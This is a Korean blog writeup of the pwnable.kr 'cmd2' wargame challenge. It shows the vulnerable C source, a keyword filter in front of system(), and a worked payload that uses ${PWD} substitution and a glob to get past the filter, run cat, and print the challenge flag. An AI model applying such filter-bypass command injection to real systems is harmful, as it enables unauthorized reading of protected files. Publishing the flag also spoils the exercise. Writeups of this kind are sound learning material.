---
title: "pwnable.kr cmd2 Writeup"
description: "Archive of security studies(2018–2022)"
date: 2020-04-14T14:56:11+09:00
# weight: 1
# aliases: ["/first"]
tags: ["security"]
author: "Byeongmin Bae"
# author: ["Me", "You"] # multiple authors
draft: false
---

이번 문제는 특이하게 커멘드를 입력받아 system 함수로 실행해줍니다.

하지만 모든 환경 변수가 지워지고 PATH 도 이상하게 바뀝니다. 게다가 입력되는 커멘드에서 환경변수와 관련된 문자열도 필터링됩니다.

```c
/*
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

===========================================================

cmd2@ubuntu:~$ checksec cmd2
[*] '/home/cmd2/cmd2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
*/

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "=")!=0;
    r += strstr(cmd, "PATH")!=0;
    r += strstr(cmd, "export")!=0;
    r += strstr(cmd, "/")!=0;
    r += strstr(cmd, "`")!=0;
    r += strstr(cmd, "flag")!=0;
    return r;
}

extern char** environ;
void delete_env(){
    char** p;
    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
    if(filter(argv[1])) return 0;
    printf("%s\n", argv[1]);
    system( argv[1] );
    return 0;
}
```

처음엔 여러가지 명령어를 시도해봤는데 PATH 때문에 당연히 먹히지 않았습니다.

그래서 다른 방법을 시도해봤습니다.

쉘에는 특별한 문법이 있습니다. `$(CMD)` 인데, CMD 부분에 명령어를 넣게 되면 해석되어 실행된 후 반환된 문자열을 쉘 인터프리터에 그대로 전달하게 됩니다.

포너블을 하시는 분들이라면 페이로드를 전달할 때 많이 사용하니 익숙하실겁니다.

```shell
andrew@ubuntu:~/fun/writeups/wargame/pwnablekr/cmd2$ $(echo "ls -al" )
total 8
drwxrwxr-x  2 andrew andrew 4096 Apr 14 05:47 .
drwxr-xr-x 15 andrew andrew 4096 Apr 14 05:47 ..
```

만약 `$()` 에 환경 변수를 넣게 되면 환경변수의 값이 쉘에 전달됩니다.

```shell
andrew@ubuntu:~/fun/writeups/wargame/pwnablekr$ ls -al ${SHELL}
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

PWD 환경변수는 현재 경로를 나타냅니다. 필터링 되는 문자중엔 슬래시(/) 가 있는데 루트 디렉터리로 이동한 다음 PWD 를 출력하면 / 가 나오니 이 부분은 우회가 가능합니다.

```shell
cmd2@pwnable:~$ ./cmd2 set
set
IFS='
'
OPTIND='1'
PATH='/no_command_execution_until_you_become_a_hacker'
PPID='253278'
PS1='$ '
PS2='> '
PS4='+ '
PWD='/home/cmd2'
cmd2@pwnable:~$
```

현재 PATH 로 인해 cat 명령이 먹히지 않아 flag 파일의 내부를 읽을 수 없는데, 실행 인자에 `\${PWD}bin\${PWD}cat` 이런식으로 넘겨주면 cat 실행이 가능합니다.

또 flag 문자열도 필터링 되어있는데 이건 fla\* 로 간단히 우회가 가능합니다.

```shell
cmd2@pwnable:/$ ~/cmd2 "\$(\${PWD}bin\${PWD}cat \${PWD}home\${PWD}cmd2\${PWD}fla*)"
$(${PWD}bin${PWD}cat ${PWD}home${PWD}cmd2${PWD}fla*)
sh: 1: FuN_w1th_5h3ll_v4riabl3s_haha: not found
```

간단하게 풀렸네요!

지저분하게 역슬래시로 이스케이핑을 한 이유는 현재 쉘이 아닌 cmd2 바이너리의 `system()` 에서 뜬 내부 쉘에서 실행되어야 하기 때문입니다.

읽어주셔서 감사합니다.